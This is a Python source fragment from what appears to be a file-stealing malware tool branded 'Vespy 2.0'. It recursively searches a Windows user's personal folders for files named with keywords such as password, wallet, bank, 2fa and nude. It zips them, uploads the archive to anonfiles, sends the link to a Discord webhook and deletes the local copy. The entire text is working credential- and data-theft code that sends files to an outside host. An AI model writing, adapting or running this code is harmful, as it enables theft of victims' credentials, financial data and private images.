class Files:

    def __init__(self):
        self.ZIP = ZipFile(f"C:\\Users\\{user}\\AppData\\Files.zip",'w')
        self.folders = []
        self.files = 0
        self.filter = ["dll","jpg","jpeg","png","mp4","mp3","webm"]
        self.goal = ["token","webhook","password","passcode","crypto","wallet","money","school","homework","paypal","cashapp","cookies","account","bank","cash","creditcard","payment","2fa","2step","recovery","grab","nude","address","backup_codes"]
        paths = [f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
        for i in paths:
            self.Grab(i)
        self.upload_send()

    def Grab(self,_):
        try:
            if _ in self.folders:
                pass
            else:
                self.folders.append(_)
                files = os.listdir(_)
                for f in files:
                    if os.path.isdir(_+"\\"+f):
                        self.Grab(_+"\\"+f)
                    else:
                        for name in self.goal:
                            if name in f:
                                try:
                                    fname = f.split(".")[-0]
                                    fext = f.split(".")[-1]
                                    if fext not in tuple(self.filter):
                                        self.files +=1
                                        self.ZIP.write(_+"\\"+f,fname+f"_{randint(1,999)}."+fext)
                                except:pass
        except:pass
    
    def upload_send(self):
        self.ZIP.close()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
        link = file.json()['data']['file']['url']['full']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"File Grabber", description=f"User's File Grabbed", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":page_facing_up: Amount of Files Grabbed : ", value=f"``{self.files}``\n\n:file_folder: **ZIP with Grabbed files** : \n**{link}**")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(f"C:\\Users\\{user}\\AppData\\Files.zip")
